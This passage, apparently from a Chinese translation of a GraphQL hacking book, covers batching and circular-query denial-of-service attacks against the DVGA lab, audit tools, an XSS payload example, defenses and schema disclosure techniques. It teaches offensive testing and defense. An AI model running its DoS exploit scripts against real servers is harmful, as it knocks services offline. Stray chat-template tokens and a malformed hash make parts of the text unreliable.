  \ -d 标志时，cURL 在底层使用 HTTP POST 方法。\n\n## 使用 Python\n\n同样的查询也可以使用 Python 执行，如清单 5-13\
  \ 所示。\n\n```\nimport requests\n\nqueries = [\n    {\"query\":\"query {systemHealth}\"\
  },\n    {\"query\":\"query {systemHealth}\"}\n]\n\nr = requests.post('http://localhost:5013/graphql',\
  \ json=queries)\n\nprint(r.json())\n```\n\n清单 5-13：使用 Python 进行基于数组的批处理查询\n\n我们声明一个\
  \ queries 数组，其中包含两个 systemHealth 查询。然后我们将它们作为一批发送给 DVGA 并打印响应。这应该返回一个包含两个元素的数组，每个元素都是对单个查询的响应。你可以在\
  \ GitHub 仓库中找到这段代码，地址为 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_batch_query.py。\n\
  \n将文件保存到桌面并运行以下命令：\n\n```\n# cd ~/Desktop\n# python3 array_based_batch_query.py\n\
  ```\n\n```\n[\n    {'data': {'systemHealth': 'System Load: 1.49\\n'}},\n    {'data':\
  \ {'systemHealth': 'System Load: 1.49\\n'}}\n]\n```\n\n不支持基于数组批处理的 GraphQL 服务器可能会抛出\
  \ HTML 错误，因为它们没有实现处理数组负载的逻辑。支持数组但已禁用数组的服务器可能会返回如下错误：\n\n```\n{'errors': [{'message':\
  \ 'Batch GraphQL requests are not enabled.'}]}\n```\n\n接下来，我们将探讨如何通过结合循环查询和基于数组的查询批处理来执行\
  \ DoS 攻击。\n\n## 串联循环查询和基于数组的查询批处理\n\n使用循环查询与基于数组的批处理相结合可能会对 GraphQL 服务器造成破坏，甚至可能使其瘫痪。请考虑清单\
  \ 5-14 中的循环查询。\n\n```\nquery {\n  pastes {    # level 1\n    owner {    # level\
  \ 2\n      pastes { # level 3\n        owner { # level 4\n          name  # level\
  \ 5\n        }\n      }\n    }\n  }\n}\n```\n\n清单 5-14：一个循环查询\n\n此递归查询的深度级别为五。单独使用可能不足以使目标服务器崩溃，但我们可以修改它使其更深。每个级别都会创建一个服务器需要处理和解析的额外节点，从而消耗更多服务器资源。\n\
  \n为了尝试循环查询，我们为你的黑客工具库编写了一个自定义漏洞利用程序。此漏洞利用程序可以通过让你指定应执行的循环次数来动态扩展其循环性。查询还能够使用数组进行批处理。以下代码摘自\
  \ https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_circular_queries.py：\n\
  \n```\nARRAY_LENGTH = 5\nFIELD_REPEAT = 10\n\nquery = '{\"query\":\"query {\"'\n\
  field_1_name = 'pastes'\nfield_2_name = 'owner'\n\ncount = 0\nfor _ in range(FIELD_REPEAT):\n\
  \    count += 1\n    closing_braces = '}' * FIELD_REPEAT * 2 + '}'\n    payload\
  \ = \"{0} {{ {1} {{ \".format(field_1_name, field_2_name)\n    query[\"query\"]\
  \ += payload\n\n    if count == FIELD_REPEAT:\n        query[\"query\"] += '__typename'\
  \ + closing_braces\n--snip--\nqueries = []\nfor _ in range(ARRAY_LENGTH):\n    queries.append(query)\n\
  \nr = requests.post('http://localhost:5013/graphql', json=queries)\n\nprint(r.json())\n\
  ```\n\n此代码基于清单 5-14 中的查询，通过根据两个主要脚本输入 ARRAY_LENGTH 和 FIELD_REPEAT 动态生成循环查询并将其添加到数组中。ARRAY_LENGTH\
  \ 是要组合在一起的查询数量。值为 5 表示数组将有五个查询。FIELD_REPEAT 表示脚本将把循环字段（pastes 和 owner）附加到查询中的次数。\n\
  \n脚本随后使用 for 循环根据 FIELD_REPEAT 的值构建查询并将其分配给 query 变量。我们初始化一个名为 queries 的空数组并运行另一个\
  \ for 循环，将我们构建的查询添加到 queries 数组中。简单来说，我们构建一个循环查询，根据预定义值将其添加到数组中，然后发送到目标。\n\n我们鼓励你在实验室中运行此脚本以了解其工作原理！将脚本下载到实验室并在运行前设置可执行（+x）权限：\n\
  \n```\n# python3 array_based_circular_queries.py\n\nQuery: query {pastes { owner\
  \ { ... } } }\nQuery Repeated: 10 times\nQuery Depth: 21 levels\nArray Length: 5\
  \ elements\n```\n\n脚本将输出查询以及有关它的一些信息，例如字段重复次数、查询的深度级别以及发送到服务器的数组长度。你可以更改 FIELD_REPEAT\
  \ 和 ARRAY_LENGTH 来观察服务器响应性的变化，通过动态增长查询和数组。\n\n这里没有神奇的数字；你需要逐步增加字段数量，直到目标服务器明显变慢。根据我们的实验室实验，将\
  \ FIELD_REPEAT 设置为至少 500 应该会导致 DVGA 因段错误而崩溃。在这种情况下，请按照第 2 章中的实验室设置指南重新启动它。\n\n##\
  \ 使用 BatchQL 检测查询批处理\n\n某些 GraphQL 工具会尝试检测目标 GraphQL 服务器上是否可用批处理。例如，BatchQL 是一个小型\
  \ Python 实用程序，用于扫描 GraphQL 弱点。它能够通过发送预检请求并观察服务器返回的错误来检测基于别名的批处理和基于数组的批处理。以下代码演示了它用于检测基于数组的批处理的逻辑：\n\
  \n```\nrepeated_query_list = \"query { assetnote: Query { hacktheplanet } }\"\n\
  repeated_query_dict = [{\"query\": repeated_query_list}, {\"query\":  repeated_query_list}]\n\
  repeated_query_success = False\ntry:\n    r = requests.post(args.endpoint, headers=header_dict,\n\
  \        json=repeated_query_dict, proxies=proxies, verify=False)\n    error_count\
  \ = len(r.json())\n--snip--\n    if error_count > 1:\n        print(\"Query JSON\
  \ list based batching: GraphQL batching is possible... preflight request was successful.\"\
  )\n```\n\n在此示例中，BatchQL 使用字段 hacktheplanet 创建一个 GraphQL 查询。然后它创建一个包含该查询两个副本的数组。BatchQL\
  \ 将数组发送到目标服务器并计算响应中返回的错误数量。如果错误数量大于一，则意味着服务器处理了两个查询。\n\n它查找返回的错误数量的原因是查询包含 hacktheplanet\
  \ 字段，该字段可能不存在于任何真实目标上。因此，GraphQL 会为每个无法处理的查询返回一个错误。BatchQL 对其基于别名的批处理检测也使用相同的错误计数逻辑。\n\
  \n让我们现在尝试对 DVGA 运行 BatchQL，看看我们能得到什么输出。使用 -e 标志指定 GraphQL 端点：\n\n```\n# cd BatchQL\n\
  # python3 batch.py -e http://localhost:5013/graphql\n\nCSRF GET based successful.\
  \ Please confirm that this is a valid issue.\nCSRF POST based successful. Please\
  \ confirm that this is a valid issue.\nQuery name based batching: GraphQL batching\
  \ is possible... preflight request was successful.\nQuery JSON list based batching:\
  \ GraphQL batching is possible...preflight request was successful.\n```\n\nBatchQL\
  \ 能够检测到基于数组的批处理和基于别名的批处理都可用。\n\n## 使用 GraphQL Cop 执行 DoS 审计\n\nGraphQL Cop 是一个基于\
  \ Python 的安全审计实用程序，能够在 GraphQL 应用中发现 DoS 和信息泄露弱点。它可以识别本章涵盖的大多数 DoS 类别。让我们使用此工具对\
  \ DVGA 进行测试，看看在不费太多力气的情况下能快速发现哪些漏洞。\n\nGraphQL Cop 只需很少的参数即可完成工作。要执行审计，请使用以下命令运行它：\n\
  \n```\n# cd ~/graphql-cop\n# python3 graphql-cop.py -t http://localhost:5013/graphql\n\
  \n    GraphQL Cop\n    Security Auditor for GraphQL\n    Dolev Farhi & Nick Aleks\n\
  \n[HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial\
  \ of Service)\n[HIGH] Batch Queries - Batch queries allowed with 10+ simultaneous\
  \ queries (Denial of Service)\n[HIGH] Field Duplication - Queries are allowed with\
  \ 500 of the same repeated field (Denial of Service)\n[HIGH] Directive Overloading\
  \ - Multiple duplicated directives allowed in a query (Denial of Service)\n\n\n\n\
  \n\n正如你所见，我们得到的输出包含每个漏洞的描述及其预定义的严重程度。该工具能够在 DVGA 中识别出四个 DoS 攻击向量。如果你在渗透测试期间需要以编程方式解析此信息，你可能需要一种更适合脚本的输出。要实现这一点，请使用\
  \ -o json 标志。\n\n## GraphQL 中的拒绝服务防御\n\n我们已经探讨了针对 GraphQL 目标执行 DoS 攻击的各种技术。虽然大多数\
  \ GraphQL 实现默认不包含全面的 DoS 缓解措施（有一些例外），但可以对我们讨论过的攻击进行防护。\n\n## 查询成本分析\n\n复杂查询对服务器的处理成本很高，尤其是在同时发送大量查询时。在进行渗透测试时，你可能会遇到实现成本分析器的\
  \ GraphQL 服务器。该术语指的是任何根据 GraphQL 字段的处理“成本”来为其分配数值系统的系统。处理涉及 CPU、输入/输出（I/O）、内存和网络资源消耗。\n\
  \n查询成本分析可以通过多种方式实现，例如在执行前使用静态分析评估查询结构，或在查询完全解析后观察查询响应。\n\n## 静态为查询分配成本\n\n成本分析的更常见形式是静态分析。例如，考虑以下查询：\n\
  \n```\nquery {\n  pastes {\n    title\n    content\n    userAgent\n    ipAddr\n\
  \    owner {\n      name\n    }\n  }\n}\n```\n\n我们使用顶层的 pastes 字段并指定了一些字段，例如 title、content\
  \ 和 owner。\n\n通过静态分析，可以以不同的方式为查询分配成本。常见的一种方式是使用专用的模式指令为每个字段或每个对象类型指定值。以下示例模式说明了如何通过使用模式指令实现成本分配：\n\
  \n```\ndirective @cost(\n  complexity: Int = 1\n) on FIELD_DEFINITION | OBJECT\n\
  \ntype PasteObject {\n  title: String @cost(complexity: 1)\n  content: String @cost(complexity:\
  \ 1)\n  userAgent: String @cost(complexity: 5)\n  ipAddr: String @cost(complexity:\
  \ 5)\n}\n```\n\n这里，一个特殊的 cost 指令接受一个 complexity 参数，而 complexity 参数接受一个整数值。如果未向 complexity\
  \ 参数提供值，则默认为 1。在模式中，PasteObject 中的字段根据其解析的资源密集程度分配了一些成本值。（想象一个需要服务器对多个第三方服务执行上游检查的字段，而与一个可以直接从本地数据库读取解析的字段相对。）\n\
  \n基于此模式定义，我们可以按如下方式将指令添加到我们的查询中：\n\n```\nquery {\n  pastes {\n    title    # cost:\
  \ 1\n    content  # cost: 1\n    userAgent # cost: 5\n    ipAddr   # cost: 5\n \
  \ }\n}\n```\n\n此查询的总成本为 12。知道总成本后，GraphQL 服务器可以决定是否应接受查询或因其被认为成本过高而拒绝它。\n\nNOTE\n\
  - 某些 GraphQL 实现如果未显式设置成本值，会自动为字段分配值为 1。\n\n许多静态成本分配库不会将成本信息持久化到任何数据库或缓存中。因此，实际上，每个查询都是按查询评估的。为了说明未能跟踪成本使用的危险，请考虑图\
  \ 5-6 中的图表。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_154_0.png)\n\n图 5-6：无状态成本分析的危险\n\
  \n这里，GraphQL 服务器已将允许的最大成本（MAX_COST）设置为 200。在此示例中，成本为 200 及以下的查询将被接受，这意味着如果客户端发送多个并行查询，所有成本均为\
  \ 200，则全部将被接受。如果应用程序的后端无法或准备好承受如此成本的并行查询，这可能会带来风险。想象一下攻击者使用允许的最大成本发送数千个请求；如果限制过于宽松，这可能会使应用程序窒息。\n\
  \n## 动态为服务器响应分配成本\n\n成本分析也可以在查询完全解析后对服务器的响应执行。服务器必须首先处理查询才能了解其成本。然而，查看实际解析的查询可以提供比静态技术更准确的成本估计。\n\
  \n这种动态方法相对于静态方法的优势在于，动态成本分配考虑了服务器返回的响应复杂性。想象一下客户端请求单个字段，结果服务器返回包含 1,000 个元素的数组。在这种情况下，响应表明了一种复杂程度，无法仅通过查看查询来推断。\n\
  \n## 使用基于积分的速率限制\n\nGraphQL 服务器可以设计为在客户端会话生命周期内跟踪所进行的查询成本。跟踪此信息允许服务器设置按小时或按天的配额限制，并在超过一定限制后拒绝查询，作为基于积分系统的部分。例如，服务器可能会为每个用户会话或每个源\
  \ IP 地址设置每小时积分额度（如 1,000）。如果查询的静态成本为 200，则客户端每小时只能进行这五个查询中的五个。要再次查询，他们必须等待积分额度配额续期。\n\
  \n然而，要使此机制正常工作，服务器必须在数据库中跟踪和存储客户端的 API 使用数据。否则，基于成本的查询限制将不得不保持无状态，这在 GraphQL API\
  \ 中很常见。\n\n## 在响应中发现查询的成本\n\n正如你所学到的，有几种方法可以在 GraphQL API 中实现成本分析控制。在某些实现中，你可能会在查询响应中看到与成本相关的元数据。考虑以下\
  \ GraphQL 响应示例，该示例使用 extensions 响应字段向客户端提供与成本相关的信息：\n\n```\n{\n  \"data\": {\n \
  \ --snip--\n  },\n  \"extensions\": {\n    \"cost\": {\n      \"credits_total\"\
  : 1000,\n```\n\n```\n\"credits_remaining\": 990,\n}\n}\n}\n```\n\nextensions 字段用于向客户端返回一些元数据。此元数据通常与查询跟踪、查询成本计算或其他调试信息相关。在此示例中，credits_total\
  \ 是可用积分总数，而 credits_remaining 是剩余积分的当前数量。\n\n你可能会问自己，为什么 GraphQL 服务器首先会与客户端共享此信息。客户端可以利用它来确定查询何时可能开始被服务器限流并可能失败。这有助于客户端构建更好的错误处理逻辑。\n\
  \n当然，成本信息的可用性对黑客来说也很有价值。如果我们有一种方法可以知道我们的查询何时会被服务器接受（例如在按小时计费的情况下），我们就有一种方法可以确定下一次积分可用时何时发起新的攻击，而不是反复发送会被阻止的请求。\n\
  \n## 查询深度限制\n\n本章前面我们讨论了循环查询以及 GraphQL 中递归查询如何耗尽服务器资源。为了保护 GraphQL 服务器免受递归查询的影响，应用程序可以设置查询深度限制。例如，将\
  \ max_depth 配置设置为 10 的值将只允许最多 10 层深度。任何超过允许深度的查询都将被拒绝。\n\n一些更成熟的 GraphQL 实现开箱即用地支持深度分析或通过利用专门为此目的编写的外部库。让我们看看如何在\
  \ graphql-ruby（Ruby）和 Graphene（Python）中实现查询深度限制。\n\n在 graphql-ruby 中，可以在 MySchema\
  \ 类中设置最大深度限制：\n\n```\nclass MySchema < GraphQL::Schema\n  --snip--\n  max_depth\
  \ 10\nend\n```\n\n在 Graphene 中，可以按以下方式设置最大深度限制：\n\n```\nschema = Schema(query=MyQuery)\n\
  \nvalidation_errors = validate(\n    schema=schema.graphql_schema,\n    document_ast=parse('THE\
  \ QUERY'),\n    rules=(\n        depth_limit_validator(\n            max_depth=20\n\
  \        ),\n    )\n)\n```\n\n\n\n\n深度通常是按查询计算的。如果攻击者同时发送多个递归查询，这仍然会对服务器造成相当大的影响。\n\
  \n## 别名和基于数组的批处理限制\n\n由于 GraphQL 别名是 GraphQL 规范的一部分，因此开发人员无法轻易禁用它们。防止别名被滥用需要自定义中间件代码来解析传入的查询，统计指定的别名数量，并在数量高到可能危险时拒绝请求。对于这种控制要在\
  \ GraphQL 应用中存在，其开发人员首先需要意识到别名造成的<|message|>安全弱点。\n\n与别名不同，基于数组的批处理不是规范文档的一部分。它通常需要安装额外的包或在代码中启用该功能。让我们看看在\
  \ Graphene 中禁用基于数组的批处理是什么样的：\n\n```\napp.add_url_rule('/graphql', view_func=GraphQLView.as_view(\n\
  \    'graphql',\n    schema=schema,\n    --snip--\n    batch=True\n))\n```\n\nbatch\
  \ 参数接受 True 或 False 的布尔值。如果我们将其切换为 False，Graphene 将拒绝处理任何数组。这是一个例子，说明 GraphQL 服务器实现原生支持禁用批处理，并且不需要自定义代码。\n\
  \n在渗透测试中，使用 GraphQL 指纹工具如 Graphw00f 来识别目标服务器实现。然后你可以使用我们整理的 GraphQL Threat Matrix\
  \ 项目（https://github.com/nicholasaleks/graphql-threat-matrix）来识别诸如基于数组的批处理等功能是否可用。如果它们存在，弄清楚它们是否可以被禁用。这些见解将有助于在渗透测试报告的修复部分中记录下来。\n\
  \n## 字段重复限制\n\n默认情况下，GraphQL 会解析查询中指定的任何字段，即使它被指定多次。即使如此，我们仍可以通过多种方式缓解字段重复攻击。\n\n\
  虽然它并不能直接解决字段重复问题，但查询成本分析在单个查询中指定大量字段时可以保护 GraphQL 应用（无论是否重复）。成本分析是对任何涉及在单个查询中指定许多字段的攻击形式的有效缓解措施。\n\
  \n另一种保护形式是使用中间件安全分析器检查传入的查询，如果任何字段重复出现超过一次则采取行动。应用程序可能会选择实施多种操作，例如完全拒绝查询或通过合并重复字段来规范化查询以消除重复。这本质上是以更安全的方式重构原始查询。目前，GraphQL\
  \ 中没有此功能。应用程序开发人员需要自行开发中间件或使用第三方安全工具来完成此操作。\n\n应用程序抵御字段重复的另一种方式是通过计算查询的字段“高度”。请考虑图\
  \ 5-7 中的查询。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_158_0.png)\n\n图 5-7：一个 GraphQL\
  \ 查询高度示例\n\n此查询请求 owner 字段，然后请求 owner 字段的 id（一次）和 name（四次）。正如你所见，总高度为 5。应用程序可能会限制超过特定允许高度的任何查询。请记住，默认情况下，GraphQL\
  \ 不实现此类控制。\n\n## 返回记录数限制\n\nGraphQL 服务器可以在客户端请求数组字段时限制返回的对象数量。为此，它们可以在服务器端设置返回的最大项目数，并阻止客户端覆盖它。以下是如何在\
  \ Graphene 中实现此操作的示例：\n\n```\ndef resolve_pastes(self, info, public=False):\n  \
  \  query = PasteObject.get_query(info)\n    return query.filter_by(public=public,\
  \ burn=False).order_by(Paste.id.desc()).limit(100)\n```\n\n此示例解析器函数用于 pastes 查询。limit\
  \ 确保无论数据库中存在多少 pastes，返回的 pastes 最大数量为 1,000。\n\n限制响应中返回的记录数的另一种方法是引入 API 分页，这控制客户端在单个请求中可以检索的记录数。\n\
  \n## 查询允许列表\n\n应用程序可能实施的另一种防御技术是允许列表方法。允许列表的概念很简单：你定义应用程序可以接受的 GraphQL 查询，并拒绝不在列表中的任何查询。你可以将此视为受信任查询的安全列表。\n\
  \n允许列表方法通常比使用拒绝列表更安全，后者更容易出错。恶意负载可以通过多种方式构造，如果在构建拒绝列表时没有考虑到所有这些变体，攻击者可能会找到绕过它的方法。\n\
  \n查询允许列表通常不存在于 GraphQL 服务器实现中，也很少有外部库实现它们。要利用此类功能，GraphQL 应用程序开发人员必须为其实现寻找兼容的库或从头创建。\n\
  \n## 自动持久化查询\n\n查询允许列表通常与一种称为 *自动持久化查询 (APQ)* 的缓存机制一起使用，该机制用于提高 GraphQL 查询的性能。GraphQL\
  \ 服务器实现 APQ 后，可以接受代表这些查询的哈希，而不是使用正常的 GraphQL 查询结构。\n\n在 GraphQL 客户端和服务器之间的 APQ 交互中，客户端首先尝试发送查询的哈希（例如\
  \ SHA-256 哈希）。服务器在缓存中执行哈希查找。如果哈希不存在，服务器返回错误。客户端随后可以跟进另一个请求，其中包含原始 GraphQL 查询及其哈希，该哈希将被存储在服务器数据库中。客户端可以在后续请求中使用此哈希，而无需提供完整查询。哈希可能如下所示：\n\
  \n```\n{\n  \"persisted_query\": {\n    \"sha256Hash\": \"5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8\"\
  \n  }\n}\n```\n\n要生成任何查询的 SHA-256 哈希，可以使用 sha256sum 命令，如下所示：\n\n```\n# echo -n \"\
  {query{pastes{owner{id}}}}\" | sha256sum\n5e734424cfdde58851234791dea3811caf8e8b389cc3aw7035044ce91679757bc8\n\
  ```\n\n这里的优势在于哈希算法产生固定长度的值（例如，SHA-256 哈希长度为 64 个字符），无论查询有多大。这消除了客户端需要在网络上传输包含大型查询的\
  \ HTTP 请求的需要，并减少了整体带宽消耗。图 5-8 说明了具有 APQ 的 GraphQL 部署可能是什么样子。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_160_0.png)\n\
  \n图 5-8：APQ 架构\n\n你可能已经注意到一个弱点。如果客户端是攻击者并强制服务器缓存恶意查询呢？攻击者是否能在后续查询中使用它？这是一个很好的问题，也是为什么\
  \ APQ 机制应与允许列表等功能共存的原因。服务器应在查询被缓存之前拒绝恶意查询，以便只有受信任的查询才能插入缓存。\n\nAPQ 首先设计为缓存机制，但它也可以作为安全控制来保护\
  \ GraphQL 服务器免受恶意查询的接受。APQ 尚未广泛使用，但在市场上一些成熟的 GraphQL 实现中得到支持，例如 Apollo GraphQL。你可以参考\
  \ GraphQL Threat Matrix 项目来了解哪些实现支持 APQ。\n\n## 超时\n\n超时是防止长时间运行和消耗资源的任务的另一种保护形式。当\
  \ GraphQL 服务器被大量查询轰炸时，完成请求可能需要几分钟时间。为缓解这些情况，服务器可以引入应用程序超时，定义请求完成所需的最长时间。\n\n一些 GraphQL\
  \ 实现，例如 graphql-ruby，允许以以下方式设置查询执行的超时：\n\n```\nclass MySchema < GraphQL::Schema\n\
  \  use GraphQL::Schema::Timeout, max_seconds: 20\nend\n```\n\n然而，并非所有 GraphQL 实现都以这种方式支持设置查询超时。那些\
  \ GraphQL 应用程序可以在 Web 服务器层使用超时，例如 Nginx 或 Apache，它们支持设置超时。\n\n设置合适的应用程序超时间隔往往是一项棘手的任务；超时配置过短可能意味着丢弃合法的客户端请求并影响客户端的用户体验，这就是为什么应用程序通常默认设置较高的超时值。Nginx\
  \ 和 Apache 都将请求超时值设置为大约 60 秒范围。\n\n\n\n\n\n超时可以有效，但不应是 GraphQL 应用程序实施的唯一缓解策略。\n\n\
  ## Web 应用防火墙\n\nWeb 应用防火墙（WAF）对于在恶意流量到达应用程序之前阻止其很有用。它们允许安全团队通过创建基于各种模式（如 HTTP 有效负载、URL\
  \ 或客户端地理位置）阻止流量的签名和规则，快速响应攻击和漏洞。\n\nWAF 已在生产环境中经过多年实战检验，保护了众多行业中的 Web 应用程序和 API，例如\
  \ REST 和 SOAP。然而，商业和开源 WAF 仍在适应 GraphQL 的工作方式，以及攻击者可能滥用 GraphQL 用于恶意目的的方式，因此 WAF\
  \ 能够为 GraphQL 应用程序提供的保护仍存在一些差距。\n\n尽管某些 WAF 并非“GraphQL 感知”，但它们检查流量的方式仍允许其检测许多恶意有效负载。它们可以阻止可疑有效负载，例如\
  \ SQL 注入、操作系统注入、跨站脚本（XSS）等，即使这些有效负载嵌入在 GraphQL 查询或变更中。\n\n考虑以下 GraphQL 查询中的 XSS\
  \ 示例：\n\n```\nmutation {\n  changeName(name:\"<script>alert(1)</script>\") {\n \
  \   name\n  }\n}\n```\n\n即使没有原生 GraphQL 支持的 WAF 也很可能识别并拒绝包含此类常见利用有效负载的请求。此外，WAF\
  \ 还可以提供其他形式的保护，例如以字节限制形式的主体大小限制以防止 DoS 攻击，或限流以减缓 DoS 尝试。\n\n然而，没有 GraphQL 支持的 WAF\
  \ 将难以防御本章中你所了解的许多攻击。例如，WAF 通常不会阻止单个 HTTP 请求，如果它们不包含任何恶意模式，例如危险的 JavaScript 有效负载（如\
  \ XSS），或 SQL 命令（在 SQL 注入的情况下）。尽管我们可以通过使用别名或基于数组的批处理在单个 HTTP 请求中发送数千个查询，但没有原生 GraphQL\
  \ 支持的 WAF 不会理解接受此类请求的危险性。\n\n## 网关代理\n\nGraphQL 网关将多个 GraphQL 模式合并为一个统一的模式，要么通过拼接它们，要么通过连接到每个单独的\
  \ GraphQL 服务以获取其模式内容。然后该模式在网关层暴露供客户端使用。图 5-9 显示了这种应用程序部署模型可能的外观。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_162_0.png)\n\
  \n图 5-9：GraphQL 网关代理到其他服务的流量\n\nGraphQL 网关在安全领域变得越来越流行，作为可以强制执行策略并执行速率限制的网络瓶颈。它们通常充当反向代理，将流量转发到其他内部\
  \ API 服务器，并可以管理多个 API 模式。网关还提供诸如可审计性、模式版本控制、授权控制、第七层 DoS 保护等功能。\n\n## 总结\n\n在本章中，我们讨论了攻击者可能向\
  \ GraphQL 服务器引入负载以进行 DoS 攻击的几种方式。我们使用了几种专用的 GraphQL 安全工具来测试 DoS 条件并剖析自定义漏洞利用，以了解其内部工作原理。你还了解了\
  \ GraphQL 中查询批处理的工作原理，以及如何通过使用数组和别名使 DoS 攻击更加强大。最后，我们探讨了 GraphQL 应用程序可以实施的各类安全防御措施，以保护自己免受\
  \ DoS 攻击。\n"
- "## 6\n\n## 信息泄露\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_164_0.png)\n\n*信息泄露漏洞*\
  \ 出现在软件系统，例如 API，向未经授权的用户泄露敏感信息时。与基于 REST 的应用程序一样，GraphQL 也并非免疫于此类问题。在本章中，我们将利用其内置功能来深入了解应用程序及其保护的数据。\n\
  \n敏感数据暴露是对 API 影响最大的攻击之一。毁灭性的漏洞可能会向潜在攻击者泄露各种信息，包括业务信息、知识产权、客户的个人身份信息等。即使无意中泄露技术信息，例如应用程序源代码、操作系统版本和文件系统路径，也可能同样严重。这些泄露可能会揭示我们可利用的额外攻击向量。\n\
  \n我们将探讨如何滥用字段建议来提取和映射 GraphQL 模式，而不管是否启用了 introspection。你还将学习通过探测 GraphQL 错误消息、调试日志和应用程序堆栈跟踪来发现本地用户、操作系统、文件系统结构和应用程序详细信息。\n\
  \n在搜索有用信息时，请记住漏洞通常可以串联使用。一个低严重性漏洞与另一个更高严重性漏洞结合使用可能会完全破坏一个应用程序。尽可能多地收集有关目标的信息，并确保跟踪记录；你永远不知道它何时会派上用场。\n\
  \n## 在 GraphQL 中识别信息泄露向量\n\n许多架构、技术和流程层面的错误都可能引入信息泄露漏洞。常见失误包括不正确或缺少数据分类流程、敏感网络和应用程序中缺乏数据加密，以及对关键功能缺乏访问管理控制。\n\
  \n导致信息泄露攻击的另一个重要因素是软件系统存储并向 API 消费者提供不必要的数据。通常，当你检查由 API 支持的前端应用程序的响应时，你会注意到它们返回的信息比前端实际使用的数据更多。这通常表明应用程序可能包含额外的信息泄露漏洞。它还表明该应用程序在交付时未经过充分的安全审查。\n\
  \n在 GraphQL 中，提取应用程序敏感信息最有效的方法之一是探索其模式，该模式提供了有关应用程序数据结构和业务逻辑的上下文。最好的方式是使用 GraphQL\
  \ introspection 功能。大多数 GraphQL 实现默认情况下都启用了 introspection。\n\n然而，在你的黑客冒险中，你可能会遇到\
  \ introspection 被禁用的 GraphQL 实现。为克服此问题，你可以运行字段填充攻击并使用旨在滥用广泛采用的字段建议功能的自动化工具。你还可以通过主动探测\
  \ GraphQL 的调试、错误和堆栈跟踪日志来获取用户和操作系统级别的信息。我们将在本章中探讨所有这些内容。\n\n## 使用 InQL 自动化模式提取\n\n\
  在之前的章节中，我们使用 introspection 查询手动发现 API 的可用查询和变更信息。为了让我们的生活更轻松，InQL 等工具（在第 2 章中安装）允许你自动提取模式。\n\
  \nInQL 使用一个与第 4 章中使用的查询非常相似的单个 introspection 查询。从结果中，它以多种格式生成模式文档，包括 HTML、JSON 和制表符分隔值（TSV）。你可以使用这些文档与\
  \ GraphQL Voyager 等工具一起进一步分析模式。\n\n通过执行以下命令提取并分析 DVGA 的模式。-t（target）标志指向 DVGA 的网络地址。我们使用\
  \ TSV 格式生成报告（--generate-tsv）：\n\n```\n# inql -t http://localhost:5013/graphql --generate-tsv\n\
  \n[+] Writing Introspection Schema JSON\n[+] DONE\n[+] Writing HTML Documentation\n\
  [+] DONE\n[+] Writing query Templates\nWriting systemUpdate query\n```\n\nInQL 将使用目标域的名称自动创建目录。如果列出其内容，你应该会看到多个模式文件：\n\
  \n```\n# cd localhost:5013/\n# ls\n\nendpoint_subscription.tsv\nendpoint_query.tsv\n\
  endpoint_mutation.tsv\nmutation\nquery\nsubscription\n```\n\n这些 TSV 文件以制表符分隔，便于查看\
  \ DVGA 中有哪些查询可用。使用 awk，我们可以仅解析查询名称：\n\n```\n# awk '{print $1}' endpoint_query.tsv\
  \ | tail -n +2\n\naudits\npaste\nreadAndBurn\npastes\n```\n\n要查看各种查询支持哪些参数，你可以发出以下\
  \ awk 命令来解析制表符分隔的输出：\n\n```\n# awk -F'\\t' '{print $1, $2}' endpoint_query.tsv\n\
  \nOperation Name Args Name\naudits\npaste id, title\nreadAndBurn id\npastes filter,\
  \ limit, public\n```\n\n要查看变更或订阅相关查询，只需将相同的 awk 命令应用于 endpoint_mutation.tsv 和 endpoint_subscription.tsv\
  \ 文件。在 InQL 生成的文档中搜索查询、变更或订阅，以及它们的 arguments、类型和其他模式相关信息，如果你想从命令行自动化某些任务，例如模糊测试、暴力破解或搜索敏感信息，这将很有用。\n\
  \n\n\n\n\n# 克服已禁用的内省\n\n即使 GraphQL 实现默认使用内省，开发者也可能会禁用它，以避免向客户端暴露有关其模式的信息。这使得了解如何与\
  \ API 交互变得更加困难，但正如你很快就会看到的，并非完全不可能。我们可以使用各种技术和精心构造的查询来窥探应用程序模式的关键元素，即使内省已关闭。\n\n\
  NOTE 要跟随本章的大部分内容，你需要在 DVGA 中将其设置为专家模式来禁用内省。请参阅第 93 页的“探索已禁用的内省”以获取说明。\n\n## 检测已禁用的内省\n\
  \n在第 4 章中，我们讨论了使用 __schema 元字段来检测内省。如果禁用了内省，此类查询应返回错误。每个 GraphQL 实现都会以不同的方式处理此错误响应。例如，一些实现可能会返回\
  \ 400 Bad Request HTTP 响应代码而没有任何有用的错误消息，而其他实现可能会选择返回 200 OK 状态代码并附带类似 Introspection\
  \ is Disabled 的消息。通常，GraphQL 服务器倾向于返回 200 OK 响应，并在 errors 响应键中包含错误消息。\n\nListing\
  \ 6-1 是你在向 Apollo Server 发送内省查询时可能会遇到的错误消息，Apollo Server 是一个流行的 GraphQL 服务器实现。\n\
  \n```\n{\n  \"errors\": [\n    {\n      \"message\": \"GraphQL introspection is\
  \ not allowed by Apollo Server, but the query contained __schema or __type. To enable\
  \ introspection, pass introspection: true to ApolloServer in production\",\n   \
  \   \"extensions\": {\n        \"code\": \"GRAPHQL_VALIDATION_FAILED\"\n      }\n\
  \    }\n  ]\n}\n```\n\nListing 6-1: 来自 Apollo GraphQL 服务器的“不允许内省”消息\n\n在接下来的两个部分中，我们测试披露技术，这些技术允许我们绕过未正确禁用的内省。\n\
  \n## 利用非生产环境\n\n在某些应用程序中，开发和暂存环境的<|message|> 安全级别与生产环境不同。即使在生产环境中禁用了内省，你也可能在其他环境中找到它已启用，在那里它可以帮助工程师构建、更新、测试和维护他们的\
  \ API。\n\n通常，非生产环境托管在 staging 或 dev 等子域上。值得检查这些环境是否可供我们访问，以及是否有任何 GraphQL 服务可能已启用内省。你可以在\
  \ https://github.com/dolevf/Black-Hat-GraphQL/blob/master/resources/non-production-graphql-urls.txt\
  \ 找到潜在的 GraphQL 暂存和开发位置列表。\n\n如果我们能够成功地针对暂存和开发环境运行内省查询，我们就可以将在那里学到的信息应用到生产环境。模式通常是相似的。\n\
